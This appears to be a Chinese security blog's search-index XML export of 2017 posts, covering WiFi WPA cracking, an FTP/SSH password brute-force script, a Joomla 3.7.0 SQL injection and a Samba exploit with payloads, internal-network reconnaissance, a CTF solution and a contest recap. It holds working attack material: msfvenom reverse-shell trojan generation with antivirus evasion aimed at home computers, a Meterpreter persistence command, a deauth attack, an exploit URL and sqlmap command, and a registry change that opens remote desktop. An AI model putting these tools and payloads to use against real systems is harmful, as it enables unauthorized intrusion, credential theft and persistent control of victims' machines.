<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[基于kali的无线破解]]></title>
      <url>http://isron.cn/2017/09/20/attack_wlan/</url>
      <content type="html"><![CDATA[<p>无线网络老师让做一个关于无线安全的报告，于是就有了这篇小白文<a id="more"></a></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>由于在虚拟机中并不能使用本机的无线网卡，所以有两种方案解决：</p>
<ol>
<li>买一个USB无线网卡，某宝大概二三十块钱</li>
<li>使用VMware将Kali装到U盘中启动</li>
</ol>
<p>当然我选择的是后者</p>
<h2 id="无线破解"><a href="#无线破解" class="headerlink" title="无线破解"></a>无线破解</h2><p>使用工具：aircrack-ng组件，无线网卡</p>
<h3 id="查看网卡"><a href="#查看网卡" class="headerlink" title="查看网卡"></a>查看网卡</h3><p><code>ifconfig</code>我这里是wlan0</p>
<h3 id="开启网卡监听"><a href="#开启网卡监听" class="headerlink" title="开启网卡监听"></a>开启网卡监听</h3><p><code>airmon-ng start wlan0</code><br><img src="./img/1.png" alt=""></p>
<h3 id="查看周围的无线网络信息"><a href="#查看周围的无线网络信息" class="headerlink" title="查看周围的无线网络信息"></a>查看周围的无线网络信息</h3><p><code>airodump-ng wlan0mon</code><br><img src="./img/2.png" alt=""><br>BSSID为该wlan的mac地址，CH是wlan的工作信道，记录下Test的BSSID和工作信道</p>
<h3 id="对目标无线网络进行监听"><a href="#对目标无线网络进行监听" class="headerlink" title="对目标无线网络进行监听"></a>对目标无线网络进行监听</h3><p><img src="./img/3.png" alt=""><br><code>-c 是指定工作信道</code> <code>-w 是我们保存网络数据的文件名，有最为重要的握手包</code><br><img src="./img/4.png" alt=""><br>现在是无人连接状态，当有人接入时会自动获取握手包<br><img src="./img/5.png" alt=""><br><code>WPA handshake</code></p>
<h3 id="什么是握手包"><a href="#什么是握手包" class="headerlink" title="什么是握手包"></a>什么是握手包</h3><p>握手包是指用WPA加密方式的无线AP与无线客户端进行连接的认证信息包，其中包含了信息原文和被加密的密文</p>
<h3 id="deauth攻击"><a href="#deauth攻击" class="headerlink" title="deauth攻击"></a>deauth攻击</h3><p>也叫取消验证洪水攻击，是无线Dos攻击的一种，通过欺骗从AP到客户端的单播地址的取消身份验证帧来将客户端转换为为认证状态，简单来说就是构造一些数据包使得AP取消与客户端的连接，让客户端掉线。<br>当客户端掉线重连时，我们可以通过之前的监听获取握手包。<br><code>aireplay-ng</code>就有这种功能<br><img src="./img/6.png" alt=""><br><code>-0 是攻击方式为deauth攻击</code> <code>20 为攻击次数20次</code> <code>-a 为ap的mac地址</code> <code>-c 为客户端mac</code><br><img src="./img/7.png" alt=""></p>
<h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><p>使用<code>aircaark-ng</code>这个模块，对抓到的握手包进行跑包，暴力破解<br><img src="./img/8.png" alt=""><br>得到wifi密码</p>
]]></content>
      
        
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[简单的ftp，ssh弱口令探测]]></title>
      <url>http://isron.cn/2017/06/18/ftp_sshscan/</url>
      <content type="html"><![CDATA[<p>需要安装<code>paramiko</code>,<code>pycrypto</code><a id="more"></a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> ftplib <span class="keyword">import</span> FTP</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> paramiko</div><div class="line"><span class="keyword">import</span> socket</div><div class="line"></div><div class="line"></div><div class="line">ftp = FTP() <span class="comment">#创建ftp对象</span></div><div class="line">ip = sys.argv[<span class="number">1</span>]</div><div class="line">timeout = <span class="number">5</span></div><div class="line">ftp_port = <span class="number">21</span></div><div class="line">ssh_port = <span class="number">22</span> <span class="comment"># 设置参数</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ftpscan</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        ftp.connect(ip, ftp_port, timeout) <span class="comment"># 连接ftp</span></div><div class="line">        <span class="keyword">return</span> <span class="number">1</span></div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">u"未开放ftp服务"</span></div><div class="line">        <span class="keyword">return</span> <span class="number">0</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ftp_blasting</span><span class="params">(username,password)</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        ftp.connect(ip, ftp_port, timeout)</div><div class="line">        ftp.login(username, password)</div><div class="line">        ftp.quit()</div><div class="line">        <span class="keyword">print</span> <span class="string">u"FTP存在弱口令"</span>+username+<span class="string">':'</span>+password</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">pass</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sshscan</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        s=socket.socket()</div><div class="line">        s.connect((ip,ssh_port))</div><div class="line">        <span class="keyword">return</span> <span class="number">1</span></div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">u"未开放ssh服务"</span></div><div class="line">        <span class="keyword">return</span> <span class="number">0</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssh_blasting</span><span class="params">(username,password)</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        client = paramiko.SSHClient()</div><div class="line">        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</div><div class="line">        client.connect(ip, ssh_port, username=username, password=password, timeout=timeout)</div><div class="line">        <span class="keyword">print</span> <span class="string">u"SSH存在弱口令"</span> + username + <span class="string">':'</span> + password</div><div class="line">        client.close()</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">pass</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    ftps=ftpscan()</div><div class="line">    sshs=sshscan()</div><div class="line">    <span class="keyword">with</span> open(<span class="string">'user.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> USER:</div><div class="line">        <span class="keyword">with</span> open(<span class="string">'pass.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> PASS:</div><div class="line">            <span class="keyword">for</span> username <span class="keyword">in</span> USER.readlines():</div><div class="line">                PASS.seek(<span class="number">0</span>)</div><div class="line">                <span class="keyword">for</span> password <span class="keyword">in</span> PASS.readlines():</div><div class="line">                    <span class="keyword">if</span> ftps:</div><div class="line">                        ftp_blasting(username.strip(<span class="string">'\n'</span>), password.strip(<span class="string">'\n'</span>))</div><div class="line">                    <span class="keyword">if</span> sshs:</div><div class="line">                        ssh_blasting(username.strip(<span class="string">'\n'</span>), password.strip(<span class="string">'\n'</span>))</div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure></p>
<p>写的比较垃圾Orz，下次补充多线程</p>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MSF生成木马后门]]></title>
      <url>http://isron.cn/2017/06/15/msf_backdoor/</url>
      <content type="html"><![CDATA[<p>在玩msf的时候发现很多人会利用反弹shell的payload去生成一个小木马，网上教程也很多了，就不再过多赘述了，=.=<a id="more"></a></p>
<h2 id="木马生成"><a href="#木马生成" class="headerlink" title="木马生成"></a>木马生成</h2><p><code>msfvenom</code>是用来制作有效载荷的工具，经常跟msf配套使用<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows<span class="regexp">/meterpreter/</span>reverse_tcp LHOST=ip LPORT=port -f exe &gt; <span class="regexp">/root/</span>Isron.exe</div></pre></td></tr></table></figure></p>
<p>利用上述命令就可以生成一个简单的exe文件格式的木马，当然也不止限于这一种格式 通过更改<code>-p</code>参数可以生成其他payload的木马</p>
<h2 id="木马免杀"><a href="#木马免杀" class="headerlink" title="木马免杀"></a>木马免杀</h2><p>在家庭计算机很多都会带有杀毒软件，所以需要做一些免杀，免杀主要的两种方式就是编码和捆绑。<br>编码可以使用<code>msfvenom</code>的编码功能去进行免杀（试了一下好像不能免杀了，逃<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">msfvenom -<span class="selector-tag">p</span> windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -<span class="selector-tag">i</span> <span class="number">12</span> -<span class="selector-tag">b</span> <span class="string">'\x00'</span> LHOST=ip LPORT=port -f exe &gt; /root/Isron<span class="selector-class">.exe</span></div><div class="line">-p选择指定payload</div><div class="line">–e选择制定编码器</div><div class="line">-<span class="selector-tag">i</span> 编码次数</div><div class="line">-<span class="selector-tag">b</span> 去多余/坏字符</div></pre></td></tr></table></figure></p>
<p>也可以使用Veil：<a href="https://github.com/Veil-Framework/Veil-Evasion" target="_blank" rel="external">Veil安装与基本用法</a>，去生成免杀木马<br>捆绑顾名思义就是将我们的木马与正常的软件进行捆绑进行免杀，可以使用<code>shellter</code>进行捆绑。</p>
<h2 id="持续控制"><a href="#持续控制" class="headerlink" title="持续控制"></a>持续控制</h2><p>在攻击成功之后会反弹回一个会话，当木马被删除或不继续运行时，我们就无法再获得反弹的会话，那么想要进行一个持续的控制就需要在第一次获得会话时动一些手脚<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">run persistence -U -<span class="selector-tag">i</span> <span class="number">5</span> -r 攻击机ip -<span class="selector-tag">p</span> 反弹端口</div><div class="line">-U 用户登录时反弹会话也可以-X当系统启动时反弹会话</div><div class="line">-<span class="selector-tag">i</span> 时间</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> 渗透测试 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> MSF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Joomla3.7.0 Core SQL注入]]></title>
      <url>http://isron.cn/2017/06/12/CVE-2017-8917/</url>
      <content type="html"><![CDATA[<h2 id="关于Joomla"><a href="#关于Joomla" class="headerlink" title="关于Joomla"></a>关于Joomla</h2><p>Joomla!是一套全球知名的内容管理系统。Joomla!是使用PHP语言加上MySQL数据库所开发的软件系统，可以在Linux、 Windows、MacOSX等各种不同的平台上执行。<a id="more"></a></p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Joomla! 3.7.0 Core</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>payload：<code>/joomla/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(1,database()),1)</code><br>Joomla在3.7.0版本中新增加了一个<code>com_fields</code>组件,由于审计能力不是很强只能跟着payload走看一下他的触发机制，<code>option=fields</code>表示选取这个组件，在<code>components/com_fields/controller.php</code>中,当<code>view=fields&amp;layout=modal</code>时会去调用<code>administrator</code>的<code>com_fields</code><br><img src="https://ooo.0o0.ooo/2017/06/12/593e48d661b31.jpg" alt=""><br>接着传入<code>list[fullordering]</code>在<code>administrator/components/com_fields/models/fields.php</code>中有这段代码:<br><img src="https://ooo.0o0.ooo/2017/06/12/593e50d9abef0.jpg" alt=""><br>将<code>list.fullordering</code>的值通过<code>$this-&gt;getState</code>传给<code>listOrdering</code>，当<code>listOrdering</code>不为空时使用<code>$db-&gt;escape</code>处理后传入<code>$query-&gt;order</code>，跟进<code>escape</code>函数：<br><img src="https://ooo.0o0.ooo/2017/06/12/593e533eea85a.jpg" alt=""><br>只是进行了一个<code>mysql_real_escape_string</code>对单双引号等字符进行转义，那么只要<code>list.fullordering</code>可控就可以注入。<br>在对<code>listOrdering</code>进行传参时调用了<code>getState</code>的方法，根据一层一层的继承关系，在<code>/libraries/legacy/model/legacy.php</code>找到了该方法：<br><img src="https://ooo.0o0.ooo/2017/06/12/593e6b101110e.jpg" alt=""><br>这里调用了一次<code>populateState</code>的方法，根据规则，调用的应该为当前即<code>FieldsModelFields</code>子类的<code>populateState</code>：<br><img src="https://ooo.0o0.ooo/2017/06/12/593e6e9b01bf5.jpg" alt=""><br>这里又调用了一次父类的<code>populateState</code>那么再跟进到父类在<code>/libraries/legacy/model/list.php</code>在父类的<code>populateState</code>方法中有这么一段：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ($list = $app-&gt;getUserStateFromRequest(<span class="keyword">$this</span>-&gt;context . <span class="string">'.list'</span>, <span class="string">'list'</span>, <span class="keyword">array</span>(), <span class="string">'array'</span>))</div><div class="line">			&#123;</div><div class="line">				<span class="keyword">foreach</span> ($list <span class="keyword">as</span> $name =&gt; $value)</div><div class="line">				&#123;</div><div class="line">					<span class="comment">// Exclude if blacklisted</span></div><div class="line">					<span class="keyword">if</span> (!in_array($name, <span class="keyword">$this</span>-&gt;listBlacklist))</div><div class="line">					&#123;</div><div class="line">						<span class="comment">// Extra validations</span></div><div class="line">						<span class="keyword">switch</span> ($name)</div><div class="line">						&#123;</div><div class="line">                                                   ...</div><div class="line">	                                        &#125;</div><div class="line"></div><div class="line">						<span class="keyword">$this</span>-&gt;setState(<span class="string">'list.'</span> . $name, $value);</div><div class="line">					&#125;</div><div class="line">				&#125;</div></pre></td></tr></table></figure></p>
<p>通过<code>$app-&gt;getUserStateFromRequest</code>取一个<code>list</code>数组，如果不在switch的黑名单内，就对相应的值进行注册,那么我们就可以请求<code>list</code>参数中的变量对<code>list.fullordering</code>进行控制。<br><img src="https://ooo.0o0.ooo/2017/06/12/593e7213a1f3b.jpg" alt=""></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u "<span class="link">http://ip/joomla/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="string">fullordering</span>]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</div></pre></td></tr></table></figure>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>安装补丁包</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="http://bobao.360.cn/learning/detail/3870.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3870.html</a></li>
<li><a href="https://www.seebug.org/vuldb/ssvid-93113" target="_blank" rel="external">https://www.seebug.org/vuldb/ssvid-93113</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> 漏洞复现 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CVE </tag>
            
            <tag> PHP </tag>
            
            <tag> CMS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Samba远程代码执行]]></title>
      <url>http://isron.cn/2017/05/30/CVE-2017-7494/</url>
      <content type="html"><![CDATA[<p>Samba是在Linux和UNIX系统上实现SMB协议的一个软件，这次的漏洞可以说是linux的“永恒之蓝”。<a id="more"></a></p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>靶机：Redhat6.0<br>安装版本：samba-3.5.4-68.el6.i686<br>开放端口：445<br>也可以用<code>VulApps</code>搭建好的Docker靶场：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">docker pull medicean/vulapps:s_samba_1</div><div class="line">docker run -d -<span class="selector-tag">p</span> <span class="number">445</span>:<span class="number">445</span> -<span class="selector-tag">p</span> <span class="number">139</span>:<span class="number">139</span> -<span class="selector-tag">p</span> <span class="number">138</span>:<span class="number">138</span> -<span class="selector-tag">p</span> <span class="number">137</span>:<span class="number">137</span> medicean/vulapps:s_samba_1</div></pre></td></tr></table></figure></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>MSF已经放出了EXP，可以使用<code>msfupdate</code>进行更新，也可以直接去github下载：<a href="https://github.com/hdm/metasploit-framework/blob/0520d7cf76f8e5e654cb60f157772200c1b9e230/modules/exploits/linux/samba/is_known_pipename.rb" target="_blank" rel="external">github</a><br>首先加载我们的Exp:<code>use exploit/linux/samba/is_known_pipename</code><br><img src="https://ooo.0o0.ooo/2017/06/13/593fd217b5d09.jpg" alt=""><br>因为是32位的系统所以<code>target=&gt;2</code><br><img src="https://ooo.0o0.ooo/2017/06/13/593fd1d97c0f7.jpg" alt=""></p>
<p><img src="https://ooo.0o0.ooo/2017/06/13/593fd299b0207.jpg" alt=""></p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>下载最新的Samba版本手动更新</p>
]]></content>
      
        <categories>
            
            <category> 漏洞复现 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CVE </tag>
            
            <tag> Linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ISCC_很普通的数独]]></title>
      <url>http://isron.cn/2017/05/24/ISCC-shudu/</url>
      <content type="html"><![CDATA[<p>题目描述：没那么简单~就能做出~数独的答案~尤其是在~看过这么多的题目<a id="more"></a><br>题目：<a href="http://123.207.139.209/CTF/ISCC_Misc-05.zip" target="_blank" rel="external">链接</a><br><img src="https://ooo.0o0.ooo/2017/06/14/5940954151b13.jpg" alt=""><br>这个题目还是很有意思的，最开始跟抠脚凡两个人在那涂了半天的数字Orz，后来还是凡的小伙伴给出了脚本，自己写不出来就分析下别人的吧<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python3</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> pytesseract</div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw  <span class="comment">#调用python的两个图像处理库</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_qr_list</span><span class="params">()</span>:</span></div><div class="line">    </div><div class="line">    qr_list = list()  <span class="comment">#初始化一个列表</span></div><div class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">5</span> * <span class="number">9</span>):  <span class="comment"># 在一个列表中再构建5*9个列表</span></div><div class="line">        qr_list.append(list())</div><div class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">5</span> * <span class="number">9</span>): <span class="comment"># 对应列表补0</span></div><div class="line">            qr_list[a].append(<span class="number">0</span>)</div><div class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> range(<span class="number">5</span>):</div><div class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> range(<span class="number">5</span>):</div><div class="line">            fname = <span class="string">'%s.png'</span> % (e * <span class="number">5</span> + f + <span class="number">1</span>) </div><div class="line">            </div><div class="line">            img = Image.open(fname).convert(<span class="string">'L'</span>) <span class="comment">#打开目标文件 L表示八位像素 黑白</span></div><div class="line">            sx, sy, ex, ey, tx = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span></div><div class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">9</span>): <span class="comment">#九行</span></div><div class="line">                ty = <span class="number">2</span></div><div class="line">                tx += <span class="number">1</span></div><div class="line">                sx = x * <span class="number">22</span> + tx + <span class="number">1</span> </div><div class="line">                <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">9</span>): <span class="comment">#九列</span></div><div class="line">                    ty += <span class="number">1</span></div><div class="line">                    sy = y * <span class="number">21</span> + ty + <span class="number">1</span> </div><div class="line">                    ex, ey = sx + <span class="number">20</span>, sy + <span class="number">19</span></div><div class="line">                                    </div><div class="line">                    img_temp = img.crop((sx, sy, ex, ey)) <span class="comment">#对图像进行剪切</span></div><div class="line">                    </div><div class="line">                    code = pytesseract.image_to_string(img_temp, config=<span class="string">"-psm 5"</span>) <span class="comment">#获取剪切后图像的数字</span></div><div class="line">                    </div><div class="line">                    <span class="keyword">if</span> code!=<span class="string">''</span>:</div><div class="line">                        qr_list[f * <span class="number">9</span> + x][e * <span class="number">9</span> + y] = <span class="number">1</span> <span class="comment">#有数字则将对应的qr_list赋值为1</span></div><div class="line">                    </div><div class="line">                    print(qr_list[f * <span class="number">9</span> + x][e * <span class="number">9</span> + y], (x, y), (sx, sy, ex, ey), (e, f, x, y)) </div><div class="line">                    </div><div class="line">    <span class="keyword">return</span> qr_list</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_qr_image</span><span class="params">(qr_list)</span>:</span></div><div class="line">    img = Image.new(<span class="string">'L'</span>, (<span class="number">10</span> * <span class="number">47</span>, <span class="number">10</span> * <span class="number">47</span>), (<span class="number">255</span>)) <span class="comment">#创建一个图像</span></div><div class="line">    draw = ImageDraw.Draw(img) </div><div class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> range(<span class="number">5</span> * <span class="number">9</span>):</div><div class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> range(<span class="number">5</span> * <span class="number">9</span>):</div><div class="line">            <span class="keyword">if</span> qr_list[f][e]: <span class="comment">#如果qr_list[f][e]为1</span></div><div class="line">                draw.rectangle(((e + <span class="number">1</span>) * <span class="number">10</span>, (f + <span class="number">1</span>) * <span class="number">10</span>, (e + <span class="number">2</span>) * <span class="number">10</span>, (f + <span class="number">2</span>) * <span class="number">10</span> ), fill=(<span class="number">0</span>)) <span class="comment">#将对应区块涂黑</span></div><div class="line">                </div><div class="line">            print(qr_list[f][e], <span class="string">' '</span>, end=<span class="string">''</span>)</div><div class="line">        print()</div><div class="line">        </div><div class="line">    img.save(<span class="string">'flag.png'</span>) <span class="comment">#保存图片</span></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    get_qr_image(get_qr_list())</div></pre></td></tr></table></figure></p>
<p>Python的图像处理库还是很强大的</p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[内网渗透笔记]]></title>
      <url>http://isron.cn/2017/05/14/LAN_Pentest/</url>
      <content type="html"><![CDATA[<p>对于整个企业来说，拿下webshell往往只是第一步，还需要进行进一步的渗透，也就是我们说的内网渗透测试，之前对内网一直都有一种神秘的感觉，最近要去参加一个内网渗透的比赛，自己也对内网进行了一些了解。<a id="more"></a></p>
<h2 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h2><p>在拿下一台边界web服务器的时候，我们就可以从这台服务器开始，对它所处的内网进行探测，可以直接用写好的脚本进行ip与端口探测<a href="http://123.207.139.209/Pentest/scan.zip" target="_blank" rel="external">RASscan</a><br>用法：将<code>RASscan.py</code>与<code>socks.py</code>上传到一个可写的目录执行<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python RASscan<span class="selector-class">.py</span> start_ip stop_ip -t <span class="number">20</span></div></pre></td></tr></table></figure></p>
<p>结果会保存在log.txt<br><img src="https://ooo.0o0.ooo/2017/06/14/5940c38264ec4.jpg" alt=""></p>
<h2 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h2><p>最开始一直使用的<code>reGeorg+Proxifier</code>在有web服务的时候可以进行内网代理，但是后来在遇到深层内网时，往往不存在web服务，就接触到了<a href="http://sourceforge.net/projects/ssocks/" target="_blank" rel="external">sSocks</a></p>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">ipconfig /all</div><div class="line">netstat –an</div><div class="line">net <span class="literal">start</span></div><div class="line">net <span class="keyword">user</span></div><div class="line"><span class="title">net</span> <span class="keyword">user</span> <span class="title">/domain</span></div><div class="line">net <span class="keyword">group</span> <span class="title">“domain</span> admins”        <span class="comment">#查看域管理员</span></div><div class="line">net localgroup administrators</div><div class="line">net view /domain</div><div class="line">dsquery server         <span class="comment">#查看域控服务器</span></div><div class="line">dsquery subnet        <span class="comment">#查看域IP范围</span></div><div class="line">query <span class="keyword">user</span>           <span class="title">#查看有多少用户在登录</span></div><div class="line">reg add <span class="string">"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections /t reg_dword /d <span class="number">0</span> /f 开启<span class="number">3389</span>远程终端</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 渗透测试 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[写在安恒杯赛后]]></title>
      <url>http://isron.cn/2017/05/09/anheng/</url>
      <content type="html"><![CDATA[<p>算是自己第二次参加线下赛了吧，还有很长的路要走<a id="more"></a></p>
<h2 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h2><p>上次参加ZCTF两天均为解题模式，这次为第一天解题，第二天攻防，第一天解题没什么说的，自己也经常在玩这个，不过还是很菜Web题一个没做出来，成功变成一名Misc选手，忙了一天最后还是取得了第三名的成绩，还不错。</p>
<h2 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h2><p>第一次参加线下攻防的比赛，不过还好学长之前给了些小脚本，上去就先布上了waf与文件监控，前期也就没怎么失分，还在文件监控日志中发现了别人传给我们的大马，也利用他们的马拿到了几个靶机，接着就是在权限维持的时候出了一些问题，自己弱智的把不死马放到了<code>upload</code>目录下，直接就被发现了，很快自己手里的靶机就全没了，再后来上传服务都修复后，就再也没得到分，到下午突然发现好几个队开始一直得分100+的那种，自己也一直被打，到结束问别人才知道，服务器开了8080端口，直接利用<code>S2-045</code>就可以批量获得flag，自己当时也看到了<code>Tomcat</code>的日志却没去管，让队友去扫端口，扫到了8080也没跟我说Orz，最后也就拿到了二等奖。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>因为跟朋友有约定说要拿到一等奖，最后也没实现，自己也需要进一步的完善自己，努力去达成这个约定。<code>The dream is to be realized.</code></p>
]]></content>
      
        <categories>
            
            <category> 总结 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Metasploit的基本使用]]></title>
      <url>http://isron.cn/2017/04/29/Metasploit_Use/</url>
